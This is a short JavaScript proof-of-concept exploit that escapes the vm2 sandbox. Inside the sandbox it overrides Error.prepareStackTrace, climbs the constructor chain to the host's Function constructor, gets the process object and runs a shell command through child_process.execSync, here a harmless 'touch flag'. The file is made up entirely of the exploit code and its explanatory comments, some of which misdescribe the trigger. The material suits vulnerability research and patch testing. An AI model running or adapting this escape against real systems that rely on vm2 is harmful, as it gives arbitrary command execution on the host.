// Import the VM class from the vm2 module to create an isolated virtual environment.
const { VM } = require("vm2");
// Initialize a new VM instance for executing code securely.
let vmInstance = new VM();

// Define JavaScript code to be executed within the VM that demonstrates a vulnerability.
const code = `
  // Override the Error.prepareStackTrace method which formats stack traces.
  Error.prepareStackTrace = (e, frames) => {
    // Access the global Function constructor through a series of constructor calls.
    // This allows execution of arbitrary code in the global context.
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag'); 
  };

  // Trigger the overridden prepareStackTrace by accessing an error's stack trace.
  (async ()=>{}).constructor('return process')() // This creates an async function and immediately invokes it,
                                                 // which exploits the global Function constructor to access the process object.
`

// Execute the malicious code within the VM.
vmInstance.run(code);